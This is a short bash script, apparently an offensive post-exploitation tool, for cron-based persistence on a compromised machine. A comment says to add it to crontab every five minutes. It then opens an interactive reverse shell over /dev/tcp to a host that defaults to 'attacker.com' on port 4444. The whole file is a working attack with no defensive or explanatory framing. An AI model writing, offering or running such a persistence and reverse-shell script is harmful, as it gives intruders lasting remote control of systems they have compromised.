#!/bin/bash
# Cron-based persistence
# Add to crontab: */5 * * * * /tmp/keepalive.sh

LHOST="${1:-attacker.com}"
LPORT="${2:-4444}"

# Re-establish reverse shell every 5 minutes
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &
